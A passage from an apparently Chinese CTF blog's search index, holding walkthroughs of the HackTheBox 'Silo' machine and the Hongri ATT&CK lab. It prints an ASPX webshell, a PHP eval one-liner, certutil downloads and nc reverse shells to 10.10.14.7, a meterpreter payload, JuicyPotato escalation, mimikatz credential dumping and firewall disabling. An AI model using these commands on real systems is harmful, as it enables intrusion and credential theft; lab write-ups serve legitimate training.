plus\u8be6\u7ec6\u64cd\u4f5c\uff1ahttps://www.cnblogs.com/CX66/p/13950514.html</p> <p>\u4f7f\u7528 odat \u4ee5 sysdba \u6743\u9650\u67e5\u8be2 Oracle \u6570\u636e\u5e93\u7684\u5229\u7528\u70b9</p> <pre><code>odat all -s 10.10.10.82 -d XE -U scott -P tiger --sysdba\n</code></pre> <p></p> <p>\u901a\u8fc7\u626b\u63cf\u7ed3\u679c\u53ef\u4ee5\u53d1\u73b0\u76ee\u6807\u5b58\u5728tns\u6295\u6bd2\u6f0f\u6d1e\uff0c\u4e0e\u6b64\u540c\u65f6\u6211\u4eec\u8fd8\u53ef\u4ee5\u5b8c\u6210\u4e0a\u4f20\u3001\u4e0b\u8f7d\u6587\u4ef6\u7b49\u64cd\u4f5c</p> <p>TNS\u6295\u6bd2\u6f0f\u6d1e\uff1aTNS\u6295\u6bd2\u6f0f\u6d1e\u662f\u9488\u5bf9Oracle\u6570\u636e\u5e93\u7f51\u7edc\u901a\u4fe1\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002TNS\uff08Transparent Network Substrate\uff09\u662fOracle\u6570\u636e\u5e93\u7528\u6765\u5b9e\u73b0\u7f51\u7edc\u8fde\u63a5\u7684\u534f\u8bae\u3002TNS\u6295\u6bd2\u6f0f\u6d1e\u7684\u5b58\u5728\u4f7f\u5f97\u653b\u51fb\u8005\u80fd\u591f\u901a\u8fc7\u6076\u610f\u64cd\u4f5c\u7f51\u7edc\u6d41\u91cf\u6765\u62e6\u622a\u548c\u7be1\u6539\u6570\u636e\u5e93\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u4ece\u800c\u6267\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff08MITM\uff09\uff0c\u83b7\u53d6\u654f\u611f\u6570\u636e\u6216\u6267\u884c\u5176\u4ed6\u6076\u610f\u64cd\u4f5c\u3002</p>"},{"location":"CTF/HTB/Windows-silo/index.html#_4","title":"\u4e0a\u4f20\u6728\u9a6c","text":"<p>\u7531\u4e8e80\u7aef\u53e3\u4e3a IIS \u7684\u9ed8\u8ba4\u754c\u9762\uff0c\u90a3\u4e48\u731c\u6d4b\u7f51\u7ad9\u76ee\u5f55\u5219\u4e3ac:\\inetpub\\wwwroot\uff0c\u5c06asp\u7248\u7684 webshell \u590d\u5236\u5230\u5f53\u524d\u76ee\u5f55\u4e0b</p> <pre><code>cp /usr/share/webshells/aspx/cmdasp.aspx .\n</code></pre> <p>\u4f7f\u7528 odat \u4e0a\u4f20 webshell</p> <pre><code>odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot mac.aspx cmdasp.aspx\n</code></pre> <p></p> <p>\u4f46\u662f\u8bbf\u95ee\u540e\u8fd4\u56de404.</p> <p></p> <p>\u731c\u6d4b\u53ef\u80fd\u539f\u56e0\u662f webshell \u8d85\u8fc7\u4e86\u5176\u5927\u5c0f\u9650\u5236\uff0c\u6211\u4eec\u53ef\u5c06\u5176\u538b\u7f29</p> <pre><code>cat cmdasp.aspx | tr -d '\\n'\n</code></pre> <p></p> <p>\u538b\u7f29\u540e\u518d\u6b21\u4e0a\u4f20\uff0c\u4f7f\u7528 sqlplus \u8fdb\u884c\u4e0a\u4f20</p> <pre><code>SQL&gt; exec utlwritefile('C:/inetpub/wwwroot', 'shell1.aspx', '&lt;%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %&gt;&lt;%@ Import Namespace=\"System.Diagnostics\" %&gt;&lt;%@ Import Namespace=\"System.IO\" %&gt;&lt;script Language=\"c#\" runat=\"server\"&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = \"cmd.exe\";psi.Argumentsc \"+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\"&lt;pre&gt;\");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\"&lt;/pre&gt;\");}&lt;/script&gt;&lt;HTML&gt;&lt;bodyasp:TextBox id=\"txtArg\" runat=\"server\" Width=\"250px\"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=\"testing\" runat=\"server\" Text=\"excute\" OnClick=\"cmdExe_Click\"&gt;&lt;/asp:Button&gt;&lt;asp:Label id=\"lblText\" runat=\"server\"&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;');\n</code></pre> <p></p> <p>\u7ed3\u679c\u8fd8\u662f\u663e\u793a\u5931\u8d25\uff0c\u539f\u6765\u662f\u4e0a\u4f20\u547d\u4ee4\u5b58\u5728\u95ee\u9898\uff0c\u53ef\u4f7f\u7528 dbmsxslprocessor \u6765\u8fdb\u884c\u4e0a\u4f20</p> <pre><code>odat dbmsxslprocessor -s 10.10.10.82 -U scott -P tiger -d XE --putFile \"C:\\inetpub\\wwwroot\" \"shell.aspx\" \"/usr/share/webshells/aspx/cmdasp.aspx\" --sysdba\n</code></pre> <p></p> <p>\u6210\u529f\u8bbf\u95ee\u6728\u9a6c\u6587\u4ef6</p> <p></p>"},{"location":"CTF/HTB/Windows-silo/index.html#shell_1","title":"\u53cd\u5f39shell","text":"<p>\u4e0a\u4f20 nc\u81f3\u670d\u52a1\u5668\uff0c\u9996\u5148\u9700\u8981\u5728\u672c\u5730\u5f00\u542f http \u670d\u52a1</p> <pre><code>cp /usr/share/windows-resources/binaries/nc.exe .\nls\npython -m SimpleHTTPServer 80\n</code></pre> <p></p> <p>\u5728\u672c\u5730\u76d1\u542c6666\u7aef\u53e3\u3002</p> <pre><code>nc -lvnp 6666\n</code></pre> <p>\u901a\u8fc7webshell\u6267\u884c\u547d\u4ee4\u5b8c\u6210\u53cd\u5f39shell\u64cd\u4f5c</p> <pre><code>certutil.exe -urlcache -f http://10.10.14.7/nc.exe C:\\WINDOWS\\TEMP\\nc.exe\nC:\\WINDOWS\\TEMP\\nc.exe 10.10.14.7 6666 -e cmd.exe\n</code></pre> <p>certutil.exe\uff1a\u8fd9\u662fWindows\u7cfb\u7edf\u81ea\u5e26\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u901a\u5e38\u7528\u4e8e\u7ba1\u7406\u8bc1\u4e66\u3002\u8fd9\u91cc\u88ab\u6ee5\u7528\u6765\u4e0b\u8f7d\u6587\u4ef6\u3002</p> <p></p> <p>\u6210\u529f\u53cd\u5f39shell\uff0c\u5728\u5f53\u524d\u7528\u6237\u684c\u9762\u4e0a\u6210\u529f\u627e\u5230\u7b2c\u4e00\u4e2aflag</p> <pre><code>dir c:\\Users\\Phineas\\Desktop\ntype c:\\Users\\Phineas\\Desktop\\user.txt\n</code></pre> <p></p> <p>\u540c\u65f6\u684c\u9762\u4e0a\u8fd8\u5b58\u5728\u540d\u4e3aOracle issue.txt\u6587\u4ef6\uff0c\u67e5\u770b\u540e\u53d1\u73b0\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u5bc6\u7801\u3002</p> <pre><code>type \"c:\\Users\\Phineas\\Desktop\\Oracle issue.txt\"\n</code></pre> <p></p>"},{"location":"CTF/HTB/Windows-silo/index.html#_5","title":"\u6743\u9650\u63d0\u5347","text":""},{"location":"CTF/HTB/Windows-silo/index.html#_6","title":"\u624b\u5de5\u5185\u6838\u63d0\u6743","text":"<p>\u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0\u8be5\u7cfb\u7edf\u4e3aWindows Server 2012</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Windows-Exploit-Suggester\u67e5\u627e\u76f8\u5173\u6f0f\u6d1e</p> <p>\u4f7f\u7528Windows-Exploit-Suggester\u5de5\u5177\u5bf9\u76ee\u6807\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u4e0eMicrosoft\u6f0f\u6d1e\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u68c0\u6d4b\u76ee\u6807\u4e0a\u53ef\u80fd\u7f3a\u5c11\u7684\u8865\u4e01\u7a0b\u5e8f\u3002</p> <p>Gtihub\u5730\u5740 : windows-exploit-suggester.py:https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p> <p>\u5177\u4f53\u64cd\u4f5c\u53ef\u4ee5\u67e5\u770b\u5176\u4ed6\u535a\u5ba2\u3002</p> <pre><code>python windows-exploit-suggester.py --systeminfo systeminfo.txt  --database 2024-07-29-mssb.xls\n</code></pre> <p></p> <p>\u9009\u62e9\u70c2\u571f\u8c46\u8fdb\u884c\u63d0\u6743\uff0c\u5728\u672c\u5730\u5f00\u542fnc\u76d1\u542c</p> <pre><code>nc -lvnp 4444\n</code></pre> <p>\u7136\u540e\u5728\u9776\u673a\u8f93\u5165\u547d\u4ee4\u4f20\u8f93\u63d0\u6743\u7a0b\u5e8f\u5e76\u8fdb\u884c\u63d0\u6743</p> <pre><code>certutil.exe -urlcache -f http://10.10.14.7/nc.exe C:\\WINDOWS\\TEMP\\nc.exe\ncertutil.exe -urlcache -f http://10.10.14.7/JuicyPotato.exe C:\\WINDOWS\\TEMP\\JuicyPotato.exe\nC:\\WINDOWS\\TEMP\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c \nC:\\WINDOWS\\TEMP\\nc.exe -e cmd.exe 10.10.14.7 4444\" -t *\n</code></pre> <p></p> <p></p> <p>\u6210\u529f\u62ff\u5230 system \u6743\u9650\u3002</p>"},{"location":"CTF/HTB/Windows-silo/index.html#oracle_1","title":"Oracle\u8fdb\u7a0b\u63d0\u6743","text":"<p>\u5224\u65adOracle\u8fd0\u884c\u6743\u9650\uff0c\u9664\u4e86\u5185\u6838\u63d0\u6743\u5916\u8fd8\u53ef\u4ee5\u901a\u8fc7Oracle\u6743\u9650\u8fdb\u884c\u53cd\u5f39\uff0c\u67e5\u770b\u8fdb\u7a0b</p> <pre><code>PS C:\\Windows\\system32&gt; tasklist /v\n\nImage Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title\n========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================\nSystem Idle Process              0 Services                   0          4 K Unknown         NT AUTHORITY\\SYSTEM                                   202:51:56 N/A\nSystem                           4 Services                   0        276 K Unknown         NT AUTHORITY\\SYSTEM                                     0:23:07 N/A\n...snip...\noracle.exe                    1136 Services                   0    638,440 K Unknown         NT AUTHORITY\\SYSTEM                                     1:37:10 N/A\nOraClrAgnt.exe                1264 Services                   0      2,484 K Unknown         NT AUTHORITY\\SYSTEM                                     0:00:00 N/A\nTNSLSNR.EXE                   1280 Services                   0     20,760 K Unknown         NT AUTHORITY\\SYSTEM                                     0:00:10 N/A\n...snip...\nw3wp.exe                      1688 Services                   0     31,192 K Unknown         IIS APPPOOL\\DefaultAppPool                              0:00:00 N/A\n...snip...\n</code></pre> <p>\u5728\u8fdb\u7a0b\u4e2d\u5e76\u672a\u53d1\u73b0 Oracle \u8fdb\u7a0b\u7531\u54ea\u4e2a\u7528\u6237\u8fd0\u884c\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8bfb\u53d6root.txt</p> <pre><code>root@kali# odat ctxsys -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --getFile c:\\\\users\\\\administrator\\\\desktop\\\\root.txt\n\n[1] (10.10.10.82:1521): Read the c:\\users\\administrator\\desktop\\root.txt file on the 10.10.10.82 server\n[+] Data stored in the c:\\users\\administrator\\desktop\\root.txt file (escape char replace by '\\n'):\nCD39EA0A..\n</code></pre> <p>\u7ed3\u679c\u663e\u793a\u53ef\u4ee5\u8bfb\u53d6 root.txt\uff0c\u8bf4\u660e Oracle \u8fdb\u7a0b\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u53ca\u4ee5\u4e0a\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u501f\u52a9MSF\u63d0\u6743\uff0c\u4f7f\u7528msfvenom \u751f\u6210 exe \u5f62\u5f0f\u53cd\u5f39\u6728\u9a6c</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=7777 -f exe -o shell.exe\n</code></pre> <p></p> <p>\u4f7f\u7528odat \u4e0a\u4f20\u6728\u9a6c\u5e76\u6267\u884c</p> <pre><code>odat utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile \\\\TEMP shell.exe ~/hackthebox/Silo/shell.exe \nodat externaltable -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --exec \\\\TEMP shell.exe\n</code></pre> <p></p> <p></p> <p>\u672c\u5730\u76d1\u542c7777\u7aef\u53e3\u540e\u6210\u529f\u83b7\u5f97\u7cfb\u7edf\u6743\u9650</p> <pre><code>msfconsole\nmsf &gt; use exploit/multi/handler\nmsf &gt; set payload windows/x64/meterpreter/reverse_tcp\nmsf &gt; set lhost 10.10.14.7\nmsf &gt; set lport 7777\nmsf &gt; run \n</code></pre> <p></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html","title":"\u7ea2\u65e5ATT&amp;CK\u7cfb\u5217\u9776\u573a\uff08\u4e00\uff09","text":"<ul> <li>\u7f51\u7edc\u7ed3\u6784:</li> </ul> <ul> <li>\u9776\u673a\u72b6\u51b5</li> </ul>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#web","title":"Web\u6e17\u900f","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#1","title":"1.\u4fe1\u606f\u6536\u96c6","text":"<p>\u4f7f\u7528\u5fa1\u5251\u7aef\u53e3\u626b\u63cf\u5de5\u5177\uff0c\u53ef\u4ee5\u770b\u5230\u5f00\u653e\u4e86\u5982\u4e0b\u7aef\u53e3</p> <p></p> <p>\u4f7f\u7528\u5fa1\u5251\u540e\u53f0\u626b\u63cf\u5de5\u5177\uff0c\u626b\u51fa\u6765\u4e0b\u9762\u51e0\u4e2a\u9875\u9762</p> <p></p> <p>\u8bbf\u95ee\u9996\u9875</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#2webshell","title":"2.\u83b7\u53d6webshell","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_1","title":"\u6f0f\u6d1e\u5229\u7528\u7684\u4e24\u79cd\u65b9\u5f0f","text":"<p>1\u3001\u9010\u4e2a\u529f\u80fd\u70b9\u6d4b\u8bd5</p> <p>2\u3001\u627e\u7279\u5f81\u7136\u540e\u641c\u7d22\u5386\u53f2\u6f0f\u6d1e</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#phpmyadmin","title":"\u5229\u7528phpMyAdmin","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_2","title":"\u7206\u7834\u7528\u6237\u540d\u5bc6\u7801","text":"<p>\u5f31\u53e3\u4ee4 root:root</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#shell","title":"\u65e5\u5fd7\u6587\u4ef6\u5199shell","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_3","title":"\u3010\u7b2c\u4e00\u6b65\u3011\uff1a\u67e5\u770b\u5f53\u524d\u65e5\u5fd7\u914d\u7f6e","text":"<pre><code>show variables like '%general%';    //\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\u5728\u54ea\u91cc\u653e\u7740\n</code></pre> <p>\u65e5\u5fd7\u5f00\u5173\u663e\u793aOFF\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u5c06\u5176\u5f00\u542fON</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_4","title":"\u3010\u7b2c\u4e8c\u6b65\u3011\uff1a\u5f00\u542f\u65e5\u5fd7","text":"<pre><code>set global general_log = on  //\u6253\u5f00\u5168\u5c40\u65e5\u5fd7\u529f\u80fd\u3002\n</code></pre> <p>\u5f00\u542f\u4e4b\u540e\uff0c\u6211\u4eec\u7684\u64cd\u4f5c\u4f1a\u88ab\u8bb0\u5f55\u5230\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_5","title":"\u3010\u7b2c\u4e09\u6b65\u3011\uff1a\u5b9a\u4e49\u65e5\u5fd7\u8def\u5f84","text":"<p>\u5728\u63a2\u9488\u9875\u9762\u627e\u5230\u7f51\u7ad9\u6839\u76ee\u5f55\uff1aC:/phpStudy/WWW</p> <p></p> <p>\u8bd5\u4fee\u6539\u65e5\u5fd7\u7684\u8def\u5f84\u5230\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\uff0c\u628a\u65e5\u5fd7\u52a0\u8f7d\u5230111.php\u91cc\u9762\uff1a</p> <pre><code>set global general_log_file='C:/phpStudy/WWW/111.php';\n</code></pre> <p></p> <p></p> <p>\u8bbf\u95ee\u4e00\u4e0b\u65e5\u5fd7\u6587\u4ef6\uff0c\u521a\u521a\u6267\u884c\u7684\u4e00\u4e9b\u64cd\u4f5c\u88ab\u8bb0\u5f55\u5728\u4e86\u65e5\u5fd7\u4e2d</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_6","title":"\u3010\u7b2c\u56db\u6b65\u3011\uff1a\u5728\u65e5\u5fd7\u4e2d\u5199\u5165\u6728\u9a6c","text":"<pre><code>SELECT '&lt;?php eval($_POST[1]);?&gt;';\n</code></pre> <p>\u8fd9\u53e5\u8bdd\u4f1a\u88ab\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d\uff0c\u76f8\u5f53\u4e8e\u5411\u65e5\u5fd7\u4e2d\u5199\u5165\u4e86\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <p></p> <p>\u53ef\u4ee5\u5728\u865a\u62df\u673a\u4e2d\u770b\u5230111.php\u6587\u4ef6\u4e2d\u786e\u5b9e\u88ab\u5199\u5165\u4e86\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6728\u9a6c\u53bb\u63a7\u5236\u7f51\u9875</p> <p></p> <p>\u7528\u8681\u5251\u8fde\u63a5\u6728\u9a6c</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#3389","title":"\u5f00\u542f3389\u7aef\u53e3\u8fdc\u7a0b\u684c\u9762\u63a7\u5236","text":"<pre><code>netstat -ano  //\u67e5\u770b\u7aef\u53e3\u5f00\u542f\u72b6\u51b5\uff0c\u53d1\u73b0\u6ca1\u67093389\u7aef\u53e3\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u5f00\u542f3389\u7aef\u53e3\uff1a</p> <pre><code>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n</code></pre> <p></p> <p>\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5192.168.111.131\uff0c\u4f46\u662f\u6b64\u65f6\u6211\u4eec\u5e76\u4e0d\u77e5\u9053\u8d26\u53f7\u548c\u5bc6\u7801\u3002</p> <p>\u4e3a\u4e86\u5f97\u5230\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u6211\u4eec\u901a\u8fc7\u8681\u5251\u4e0a\u4f20mimikatz\u3002</p> <p></p> <pre><code>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonPasswords\" \"exit\"\n</code></pre> <p>\u8be5\u547d\u4ee4\u7528\u4e8e\u63d0\u53d6\u7cfb\u7edf\u4e2d\u7684\u654f\u611f\u4fe1\u606f\uff0c\u7279\u522b\u662f Windows \u7cfb\u7edf\u4e2d\u7684\u51ed\u636e\uff08\u5982\u767b\u5f55\u5bc6\u7801\uff09\u3002\u5176\u4e2d\uff1a</p> <p>mimikatz.exe\uff1a\u8fd9\u662f\u5de5\u5177\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002</p> <p>\"privilege::debug\"\uff1a\u8fd9\u662f Mimikatz \u7684\u4e00\u4e2a\u6a21\u5757\uff0c\u7528\u4e8e\u63d0\u5347\u8fdb\u7a0b\u6743\u9650\u3002Windows \u7cfb\u7edf\u4e2d\uff0c\u67d0\u4e9b\u654f\u611f\u64cd\u4f5c\uff08\u5982\u8bfb\u53d6\u5185\u5b58\u4e2d\u7684\u5bc6\u7801\u6570\u636e\uff09\u9700\u8981 Debug \u6743\u9650\u3002\u6b64\u547d\u4ee4\u5c1d\u8bd5\u5c06 Mimikatz \u7684\u8fdb\u7a0b\u63d0\u5347\u4e3a\u5177\u6709\u8c03\u8bd5\u6743\u9650\u3002</p> <p>\"sekurlsa::logonPasswords\"\uff1a\u8fd9\u662f Mimikatz \u7684\u4e00\u4e2a\u529f\u80fd\u6a21\u5757\uff0c\u7528\u4e8e\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u7528\u6237\u7684\u767b\u5f55\u4fe1\u606f\uff0c\u5305\u62ec\u660e\u6587\u5bc6\u7801\u3001\u54c8\u5e0c\u503c\u7b49\u3002\u8fd9\u4f9d\u8d56\u4e8e\u7cfb\u7edf\u4e2d\u67d0\u4e9b\u5b89\u5168\u673a\u5236\uff08\u5982 LSASS \u670d\u52a1\uff09\u5b58\u50a8\u7684\u51ed\u636e\u3002</p> <p>\"exit\"\uff1a\u6267\u884c\u5b8c\u524d\u9762\u7684\u64cd\u4f5c\u540e\uff0c\u9000\u51fa Mimikatz\u3002</p> <p></p> <p>\u627e\u5230\u7528\u6237\u540d\u548c\u5bc6\u7801</p> <p></p> <p>\u8f93\u5165\u8d26\u53f7(GOD\\administrator)\u5bc6\u7801(hongrisec@2020)\uff0c\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u6210\u529f</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#_7","title":"\u5185\u7f51\u6e17\u900f","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#1_1","title":"1. \u5185\u7f51\u4fe1\u606f\u641c\u96c6","text":"<pre><code>whoami \u5f53\u524d\u7684\u767b\u5f55\u8d26\u53f7\nhostname \u673a\u5668\u540d\nsysteminfo \u7535\u8111\u76f8\u5173\u4fe1\u606f\nnet user /domain \u67e5\u8be2\u57df\u4e2d\u6709\u591a\u5c11\u4e2a\u8d26\u53f7\nnet group \"domain computers\" /domain \u67e5\u8be2\u57df\u4e2d\u6709\u51e0\u53f0\u7535\u8111\nnslookup -type=SRV _ldap._tcp \u67e5\u770b\u57df\u63a7\u7684ip\u548c\u5b83\u7684\u4f4d\u7f6e\nipconfig \u67e5\u770bip\u5730\u5740\u4fe1\u606f\narp -a \u67e5\u770b\u5b58\u6d3b\u7684\u4e3b\u673a\n</code></pre> <p>\u673a\u5668\u540d\u663e\u793astu1\uff0cgod\u548cstu1\u4e0d\u4e00\u6837\uff0c\u731c\u6d4b\u8fd9\u4e2a\u8d26\u53f7\u662f\u57df\u8d26\u53f7</p> <p></p> <p>\u53d1\u73b0\u57df\u540d\u662fgod.org</p> <p></p> <p>\u53d1\u73b0\u4e94\u4e2a\u7528\u6237</p> <p></p> <p>\u53d1\u73b0\u57df\u4e2d\u52a0\u5165\u4e863\u53f0\u7535\u8111\uff1aDEV\u3001ROOT-TVI862UBEH\u3001STU1\uff0c\u5f53\u524dstu1\u5df2\u7ecf\u88ab\u6211\u4eec\u63a7\u5236</p> <p></p> <p>\u67e5\u5230\u57df\u63a7\u7684ip\u5730\u5740192.168.52.138\uff0c\u57df\u63a7\u540d\u5b57owa.god.org\uff08\u5176\u4e2dowa\u662f\u57df\u63a7\u7535\u8111\u7684\u673a\u5668\u540d\uff09</p> <p></p> <p>\u53d1\u73b0\u7535\u8111\u53cc\u7f51\u5361\u8fd0\u884c\uff0c\u6709\u4e24\u4e2aip\uff1a192.168.111.121/192.168.52.143   \uff0c \u5176\u4e2d192.168.111.121\u88ab\u6211\u4eec\u63a7\u5236\uff0c\u53e6\u4e00\u4e2aip\u901a\u5411\u53e6\u4e00\u4e2a\u7f51\u6bb5</p> <p></p> <p>52\u7f51\u6bb5\u67092\u53f0\u4e3b\u673a\u5b58\u6d3b\uff1a192.168.52.138/192.168.52.141</p> <p></p> <p>\u786e\u5b9a\u4e0a\u9762\u4e24\u4e2aip\u5bf9\u5e94\u7684\u662f\u8c01\uff0c\u627e\u4e00\u4e0b\u57df\u540d\u5bf9\u5e94\u7684IP\u5730\u5740\uff0cping \u4e3b\u673a\u540d.\u57df\u540d\uff0c\u53ef\u4ee5\u5f97\u5230IP</p> <p>\u4f8b\u5982\uff1aping ROOT-TVI862UBEH.god.org\uff0c\u5f97\u5230ip\u4e3a192.168.53.141</p> <p>192.168.53.141 \u5bf9\u5e94ROOT-TVI862UBEH.god.org\uff08\u57df\u5185\u4e3b\u673a\uff09</p> <p>192.168.52.138 \u5bf9\u5e94owa.god.org\uff08\u57df\u63a7\uff09</p> <p>192.168.111.131 \u5bf9\u5e94stu1.god.org\uff08\u5df2\u7ecf\u63a7\u5236\u4e86\uff09</p> <p></p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#2-psexec","title":"2. \u5185\u7f51\u6e17\u900f\uff08PSexec\u6a2a\u5411\u6e17\u900f\uff09","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#1cs","title":"1.\u8681\u5251\u5230cs\u7684\u8fc1\u79fb\u4e0a\u7ebf","text":"<p>\u9009\u62e9windows exe\u53ef\u6267\u884c\u6587\u4ef6\u653b\u51fb</p> <p></p> <p>\u7528\u8681\u5251\u4e0a\u4f20\u521a\u521a\u751f\u6210\u7684.exe\u6587\u4ef6\u5e76\u6267\u884c\uff0ccs\u91cc\u9762\u663e\u793a\u76ee\u6807\u4e3b\u673a\u4e0a\u7ebf</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#2","title":"2.\u63d0\u6743","text":""},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#ms14-058cve-2014-4113","title":"MS14-058\uff08CVE-2014-4113\uff09","text":"<p>\u67e5\u770b\u9632\u706b\u5899\u72b6\u6001</p> <pre><code>shell netsh firewall show state\n</code></pre> <p></p> <p>\u5173\u95ed\u9632\u706b\u5899\u72b6\u6001</p> <pre><code>shell netsh advfirewall set allprofile state off\n</code></pre> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#3","title":"3.\u6a2a\u5411","text":"<p>\u67e5\u770b\u5f53\u524d\u57df\u5185\u5217\u8868</p> <pre><code>net view  \n</code></pre> <p></p> <p>\u5728CS\u6267\u884c\u6210\u529f\u540e\uff0c\u5b83\u81ea\u5df1\u4f1a\u5c06\u8fd9\u4e9b\u4e3b\u673a\u6dfb\u52a0\u8fdb\u53bb</p> <p></p> <p>\u67e5\u770b\u57df\u63a7\u5217\u8868</p> <pre><code>net dclist\n</code></pre> <p></p> <p>\u5148\u6293\u53d6\u670d\u52a1\u5668\u51ed\u8bc1</p> <p></p> <p>\u6293\u53d6\u660e\u6587\u5bc6\u7801</p> <p></p> <p>\u521b\u5efaSMB\u76d1\u542c\u5668 \u00a0</p> <p></p> <p>psexec\u62ff\u4e0b\u57df\u63a7OWA</p> <p></p> <p></p> <p></p> <p>\u7136\u540e\u62ffOWA\u7684session\u53bb\u6253\u53e6\u4e00\u4e2a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u62ff\u4e0b\u57df\u673a\u5668ROOT-TVI862UBEH \u00a0 \u00a0</p> <p></p> <p>\u81ea\u6b64\u62ff\u4e0b\u6240\u6709\u57df\u63a7\uff01\uff01\uff01</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#3_1","title":"3.\u5185\u7f51\u6e17\u900f(\u4ee3\u7406)","text":"<p>\u8fd9\u79cd\u65b9\u5f0f\u5f88\u4e0d\u7a33\u5b9a\uff0c\u4e0a\u9762\u7684\u8fc7\u7a0b\u8fdb\u884c\u5230\u5f00\u542f\u4e86WEB\u9776\u673a\u76843389\u7aef\u53e3\u540e\u8fdb\u884c\u3002</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html#1_2","title":"1. \u6302\u4ee3\u7406\uff1a","text":"<pre><code>\u653b\u51fb\u673a:./ew_for_linux64 -s rcsocks -l 1080 -e 1234\nWin7:ew.exe -s rssocks -d 192.168.111.128 -e 1234\n</code></pre> 